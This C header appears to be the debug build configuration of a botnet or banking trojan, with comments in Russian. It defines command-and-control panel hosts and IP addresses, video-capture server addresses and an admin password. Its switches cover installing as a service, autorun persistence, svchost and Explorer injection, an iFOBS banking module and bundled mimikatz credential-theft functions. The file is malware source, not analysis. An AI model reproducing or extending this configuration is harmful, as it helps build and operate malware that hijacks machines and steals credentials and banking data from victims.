#pragma once

//дебаг версия 
#include "..\builder.h"

//#define ADMIN_PANEL_HOSTS "85.25.84.223"
#define ADMIN_PANEL_HOSTS "qwqreererwere.com"
//#define ADMIN_PANEL_HOSTS "akamai-technologies.org"
#define ADMIN_AZ "admin_az"
#define USER_AZ "admin"
#define VIDEO_SERVER_IP "192.168.0.100:700"
//#define VIDEO_SERVER_IP "37.1.212.100:700"
//#define VIDEO_SERVER_IP "188.138.98.105:710"
//#define FLAGS_VIDEO_SERVER "0000005"
#define FLAGS_VIDEO_SERVER "1000005"
//#define ADMIN_PASSWORD "cbvhX3tJ0k8HwnMy"
#define ADMIN_PASSWORD "1234567812345678"
#define PREFIX_NAME "myt"
#define PERIOD_CONTACT "30"
#define MISC_STATE "1110"

//настройки для отключения разных функций
//отключить установку сервиса
//#define OFF_SERVICE
//#define OFF_SDPROP
//отключить уставновку в автозапуск (в тот что в меню винды)
//#define OFF_AUTORUN
//при запуске не запускаться в свцхосте
//#define OFF_SVCHOST
//все отсылаемые данные (скриншоты, логи) ложатся в папку c:\botdebug
#define ON_SENDDATA_FOLDER
//все плагины берутся из папки c:\plugins
#define ON_PLUGINS_FOLDER
#define ON_VIDEOSERVER
//при работе не использовать проводник (не инжектится в него)
#define NOT_EXPLORER
//подключение ифобс
//#define ON_IFOBS
//подключение функций из программы mimikatz
#define ON_MIMIKATZ
